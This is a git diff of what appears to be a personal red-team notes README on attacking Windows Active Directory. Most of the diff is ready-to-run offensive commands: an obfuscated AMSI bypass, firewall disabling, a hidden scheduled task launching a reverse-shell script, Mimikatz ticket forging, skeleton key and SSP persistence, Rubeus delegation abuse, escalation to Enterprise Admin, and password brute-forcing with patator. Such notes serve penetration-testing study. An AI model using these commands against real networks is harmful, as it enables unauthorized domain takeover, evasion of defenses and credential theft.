@@ -5,10 +5,33 @@ AD module can be found at [Microsoft](https://docs.microsoft.com/en-us/powershel
 This repo is a collection of notes rather than reference to chain an attack.
 # Contents
 
-[1. Initial Access](#1-initial-access)<br>
-[2. Execution](#2-execution)<br>
+[1. Local Privilege Escalation](#1-local-privilege-escalation)<br>
+- 1.1 Scripts<br>
+- 1.2 SCManager<br>
+[2. Lateral Movement](#2-lateral-movement)<br>
+- 2.1 Explicit Creds
+- 2.2 Add hosts to trusted sources
+- 2.3 "Overpass the hash"
+[3. Defense Evasion](#3-defense-evasion)<br>
+- 3.1 AMSI Bypass
+- 3.2 Disable Local Firewall
+- 3.3 Bypass UAC (fodhelper.exe)
+- 3.4 Bypass UAC (cmstp.exe)
+- 3.5 Bypass CLM
+[4. Persistence](#2-persistence)<br>
+- 4.1 Local Persistence: Scheduled Tasks
+- 4.2 Domain Persistence: Silver Ticket
+- 4.3 Domain Persistence: Golden Ticket
+- 4.4 Domain Persistence: Skeleton Key
+- 4.5 Domain Persistence: DSRM
+- 4.6 Domain Persistence: Custom SSP
+[5. Privilege Escalation](#2-privilege-escalation)<br>
+- 5.1 Constrained Delegation
+- 5.2 LAPS Passwords
+- 5.3 Resource-Based Constraint Delegation
+[6. Miscellaneous Commands](#2-miscellaneous-commands)<br>
 
-# 1 Local privilege escalation
+# 1 Local Privilege Escalation
 1.1 Scripts:
 - PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
 - BeRoot: https://github.com/AlessandroZ/BeRoot
@@ -18,7 +41,7 @@ This repo is a collection of notes rather than reference to chain an attack.
 - First step is to run “sc sdshow scmanager” in cmd.exe which gives the permissions of what users/groups can access this service
 - Create a service using the sc.exe command in a command prompt
 sc create MyService displayName= "MyService" binPath= "C:\Windows\System32\net.exe localgroup Administrators itemployee21 /add" start= auto
-# 2 Lateral movement
+# 2 Lateral Movement
 2.1 Spawn Reverse Shell With Explicit Creds
 
 $username='domain\username'<br>
@@ -40,7 +63,7 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:subdomain.d
 
 sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 
-3.2 Disable local firewall
+3.2 Disable Local Firewall
 
 Get firewall profiles
 get-netfirewallprofile -profile domain,public,private | format-table -property name,enabled
@@ -58,23 +81,23 @@ set-netfirewallprofile -profile domain,public,private -enabled false
 
 Please refer to CLMBypass.ps1. The script utilizes System.Management.Automation.PowerShell.Runspace to bypass CLM. Assembly compiled to .exe executable, but the script can be modified to be chained with AppLocker bypass scenarios.
 
-# 3 Persistence
+# 4 Persistence
 
-3.1 Local persistence: Scheduled tasks
+4.1 Local persistence: Scheduled tasks
 
 schtasks /create /sc minute /mo 1 /tn evil /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass c:\temp\rev.ps1" /f
 
-3.2 Domain Persistence: Silver Ticket
+4.2 Domain Persistence: Silver Ticket
 
 Using hash of the Domain Controller computer account, below command provides access to shares on the DC
 Invoke-Mimikatz -Command '"kerberos::golden /domain:subdomain.domain.local /sid:sid:S-1-5-21-268341927-4156871508-1792461683 /target:dc.subdomain.domain.local /service:CIFS /rc4:a9b30e5b0dc865eadcea9411e4ade72d /user:Administrator /ptt'
 
-3.3 Domain Persistence: Golden Ticket
+4.3 Domain Persistence: Golden Ticket
 
 Execute mimikatz on DC as DA to get krbtgt hash
 	Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dc
   
-3.4 Domain Persistence: Skeleton Key
+4.4 Domain Persistence: Skeleton Key
 
 Inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required
 
@@ -90,7 +113,7 @@ In case lsass is running as a protected process, we can still use Skeleton Key b
  
  IT'S VERY NOISY!
 
-3.5 Domain Persistence: DSRM
+4.5 Domain Persistence: DSRM
 
 - Dump DSRM password (needs DA privs)
 	Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dc
@@ -100,7 +123,7 @@ In case lsass is running as a protected process, we can still use Skeleton Key b
 
 	Enter-PSSession -Computername dcorp-dc Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 
   
-3.6 Domain Persistence: Custom SSP
+4.6 Domain Persistence: Custom SSP
 
 - Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages:
 	$packages = Get-ItemProperty HTKLM:\System\CurrentControlSet\Control\Lsa\OSConfig \ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
@@ -113,21 +136,43 @@ In case lsass is running as a protected process, we can still use Skeleton Key b
 
 	# All local logons on the DC are logged to C:\Windows\system32\kiwissp.log
 
-# 4 Privilege Escalation
+# 5 Privilege Escalation
 
-4.1 Rubeus Constained Delegation
+5.1 Rubeus Constained Delegation
 .\Rubeus.exe s4u /user:dbservice /domain:sub.domain.local /rc4:6f9e22a64970f32bd0d86fddadc8b8b5 /impersonateuser:"Administrator" /msdsspn:"time/ufc-dc1" /altservice:cifs /ptt
 
-4.2 LAPS passwords
+5.2 LAPS passwords
 
 Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs |
 Where-Object{($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object { $_ | Add-Member -NoteProperty 'IdentitySID' $(Convert-NameToSid. $_IdentityReference).SID; $_}
 
-# 5 Defense Evasion
-# 6 Credential Access
-# 7 Discovery
-# 8 Lateral Movement 
-# 9 Collection
-# 10 Command and Control
-# 11 Exfiltration
-# 12 Impact
+5.3 Resource-Based Constrained Delegation
+
+. .\powermad.ps1
+
+new-machineaccount -domain sub.domain.local -domaincontroller 192.168.4.2 -machineaccount attacker -Password (ConvertTo-Securestring 'Password123' -AsPlainText -Force) -Verbose
+
+#import ADModule
+set-adcomputer <target> -PrincipalsAllowedToDelegateToAccount attacker$ -Verbose 
+
+.\Rubeus.exe s4u /user:attacker$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:http/<target> /ptt
+
+5.4 From DA to EA
+
+invoke-mimikatz -command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-4056425676-3036975250-1243519898 /sids:S-1-5-21-3331877400-209796306-1317730910-519 /rc4:da6010de93e6e1c94bdd90bb42a9920e /ptt"'
+
+SID parameter refers to current domain SID. SIDS is a combination of target domain SID + 519 (Enterprise Admins group). rc4: is krbtgt hash or external trust key (can be dumped by Invoke-Mimikatz -Command '"lsadump::lsa patch"' on dc)
+
+# 6 Miscellaneous Commands
+
+- Use CEWL to generate wordlist
+
+cewl -d 5 -m 3 -w wordlist http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers 
+./ffuf -w /usr/share/wordlists/dns1.txt -u http://FUZZ.fabricorp.local 
+
+- Pattator http_fuzz module
+
+patator http_fuzz url=http://172.31.179.1/intranet.php method=POST follow=1 accept_cookie=1 body="Username=FILE0&Password=123" 0=users -x ignore:fgrep='Invalid' proxy_type="http" proxy="127.0.0.1:8080" -t 25
+
+- Local Enumeration Scripts: HostEnum.ps1 [https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1](https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1)
+
